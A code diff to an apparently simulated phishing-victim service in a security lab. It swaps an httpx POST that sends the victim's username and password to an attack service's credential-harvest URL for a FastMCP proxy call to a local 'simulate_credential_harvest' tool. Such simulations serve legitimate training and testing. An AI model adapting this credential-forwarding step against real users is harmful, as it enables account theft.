@@ -3,6 +3,7 @@ import httpx
 from fastapi import FastAPI, Request, HTTPException
 from pydantic import BaseModel
 import logging
+from fastmcp import FastMCP
 
 # --- Configuration for the Victim ---
 # In a real scenario, this would be loaded from env vars or a config file
@@ -58,30 +59,17 @@ async def receive_email(email: PhishingEmail):
             f"Simulating user clicking the malicious link: {email.malicious_link}"
         )
         try:
-            # "Clicking the link" means sending its credentials back to the attacker
-            async with httpx.AsyncClient() as client:
-                credentials = {
-                    "username": VICTIM_CONFIG["username"],
-                    "password": VICTIM_CONFIG["password"]
-                }
-                logger.info(f"Sending credentials {credentials} to {VICTIM_CONFIG['attack_service_credential_harvest_url']}")
-
-                # We use the credential harvest URL from our own config.
-                # In a more complex scenario, the malicious_link itself would be visited.
-                response = await client.post(
-                    VICTIM_CONFIG["attack_service_credential_harvest_url"],
-                    json=credentials,
-                    timeout=10
+            attack_service = FastMCP.as_proxy("http://127.0.0.1:8001/mcp/")
+            async with attack_service.client as client:
+                await client.call_tool(
+                    "simulate_credential_harvest",
+                    arguments={
+                        "username": VICTIM_CONFIG["username"],
+                        "password": VICTIM_CONFIG["password"]
+                    }
                 )
-                response.raise_for_status()
+            return {"status": "compromised", "detail": "Credentials sent to attacker."}
 
-                logger.info(f"Successfully sent credentials to attack service. Response: {response.text}")
-                return {"status": "compromised", "detail": "Credentials sent to attacker."}
-
-        except httpx.RequestError as e:
-            error_message = f"Failed to connect to the malicious link (attack service): {e}"
-            logger.error(error_message)
-            raise HTTPException(status_code=500, detail=error_message)
         except Exception as e:
             error_message = f"An unexpected error occurred during credential submission: {e}"
             logger.error(error_message)
